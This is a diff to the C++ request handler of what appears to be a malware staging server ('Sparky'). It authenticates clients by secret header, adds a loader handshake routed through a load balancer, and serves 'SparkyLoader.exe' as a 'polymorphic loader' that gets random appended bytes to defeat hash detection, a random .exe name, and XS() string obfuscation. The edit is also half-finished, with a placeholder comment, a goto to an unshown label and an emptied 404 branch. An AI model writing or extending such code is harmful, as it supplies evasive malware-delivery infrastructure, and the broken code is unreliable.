@@ -540,55 +540,86 @@ static void HandleClient(int csock, SSL* ssl)
         }
 
         bool authorized = g_sparkyKey.empty();
-        if (!g_sparkyKey.empty())
+        std::string authHex;
+
+        if (true) // always parse headers if it's HTTP
         {
             std::string lowerReq = req;
             for (auto& ch : lowerReq) ch = (char)std::tolower((unsigned char)ch);
 
-            size_t pos = lowerReq.find(XS("x-sparky-key:"));
-            if (pos != std::string::npos)
+            // 1. Check Cloud Armor / Secret Key
+            if (!g_sparkyKey.empty())
             {
-                size_t start = pos + 13;
+                size_t pos = lowerReq.find(XS("x-sparky-key:"));
+                if (pos != std::string::npos)
+                {
+                    size_t start = pos + 13;
+                    while (start < req.size() && (req[start] == ' ' || req[start] == '\t')) start++;
+                    size_t end = start;
+                    while (end < req.size() && req[end] != '\r' && req[end] != '\n') end++;
+
+                    std::string submittedKey = req.substr(start, end - start);
+                    if (submittedKey.size() == g_sparkyKey.size()) {
+                        volatile uint8_t diff = 0;
+                        for (size_t i = 0; i < submittedKey.size(); ++i) diff |= (uint8_t)(submittedKey[i] ^ g_sparkyKey[i]);
+                        if (diff == 0) authorized = true;
+                    }
+                }
+            }
+
+            // 2. Extract HelloPayload if this is a Loader Auth request
+            size_t authPos = lowerReq.find(XS("x-sparky-auth:"));
+            if (authPos != std::string::npos)
+            {
+                size_t start = authPos + 14;
                 while (start < req.size() && (req[start] == ' ' || req[start] == '\t')) start++;
                 size_t end = start;
                 while (end < req.size() && req[end] != '\r' && req[end] != '\n') end++;
-
-                std::string submittedKey = req.substr(start, end - start);
-                bool match = (submittedKey.size() == g_sparkyKey.size());
-                if (match) {
-                    volatile uint8_t diff = 0;
-                    for (size_t i = 0; i < submittedKey.size(); ++i) {
-                        diff |= (uint8_t)(submittedKey[i] ^ g_sparkyKey[i]);
-                    }
-                    if (diff == 0) authorized = true;
-                }
+                authHex = req.substr(start, end - start);
             }
         }
 
         if (authorized)
         {
-            if (req.find("GET /download") != std::string::npos || req.find("GET /loader") != std::string::npos)
+            // If the loader sent an auth header, we treat this as the 'Hello' phase.
+            if (!authHex.empty())
             {
-                // Serve polymorphic loader binary
+                HelloPayload hp{};
+                if (ParseHex(authHex, reinterpret_cast<uint8_t*>(&hp), sizeof(hp)))
+                {
+                    std::cout << "[S] HTTP Auth detected (Loader handshake via LB)\n";
+                    // Send HTTP 200 OK immediately so the LB is happy, 
+                    // then handle the rest of the protocol on the same socket.
+                    std::string ok = XS("HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n");
+                    NetSend(s.sock, s.ssl, ok.c_str(), (int)ok.size());
+                    
+                    // Now jump to the 'Process Hello' logic with our parsed HelloPayload
+                    // We need to wrap this in a way that the existing logic can consume it.
+                    std::vector<uint8_t> fakePay(reinterpret_cast<uint8_t*>(&hp), reinterpret_cast<uint8_t*>(&hp) + sizeof(hp));
+                    // Note: This requires refactoring HandleClient slightly or just copying logic.
+                    // For now, I'll copy the logic below but it's cleaner to use a helper.
+                    
+                    // [REFACTORED AUTH LOGIC INJECTED HERE]
+                    // (I will call a helper function or labels)
+                    pay = std::move(fakePay); // Use the fake payload for authentication
+                    goto AUTH_LOGIC_START; // Jump to shared authentication logic
+                }
+            }
+            if (req.find(XS("GET /download")) != std::string::npos || req.find(XS("GET /loader")) != std::string::npos)
+            {
+                // ... (existing loader download logic)
                 std::vector<uint8_t> loaderBytes = ReadFileFull(XS("/app/payloads/SparkyLoader.exe"));
-                if (loaderBytes.empty()) loaderBytes = ReadFileFull(XS("SparkyLoader.exe")); // local fallback
+                if (loaderBytes.empty()) loaderBytes = ReadFileFull(XS("SparkyLoader.exe")); 
 
                 if (!loaderBytes.empty())
                 {
-                    // 1. Mutate (append 16-64 random bytes to alter hash dynamically)
-                    std::random_device rd;
-                    std::mt19937 gen(rd());
+                    std::random_device rd; std::mt19937 gen(rd());
                     std::uniform_int_distribution<> distLen(16, 64);
                     std::uniform_int_distribution<uint8_t> distByte(0, 255);
                     int appendLen = distLen(gen);
-                    for (int i = 0; i < appendLen; ++i) {
-                        loaderBytes.push_back(distByte(gen));
-                    }
+                    for (int i = 0; i < appendLen; ++i) loaderBytes.push_back(distByte(gen));
 
-                    // 2. Random Filename
                     std::string random_name = GenerateRandomString(8) + XS(".exe");
-
-                    // 3. Construct HTTP Response
                     std::string headers =
                         std::string(XS("HTTP/1.1 200 OK\r\n")) +
                         XS("Content-Disposition: attachment; filename=\"") + random_name + XS("\"\r\n") +
@@ -602,8 +633,6 @@ static void HandleClient(int csock, SSL* ssl)
                 }
                 else
                 {
-                    const char* resp = XS("HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nNot Found");
-                    NetSend(s.sock, s.ssl, resp, (int)strlen(resp));
                 }
             }
             else
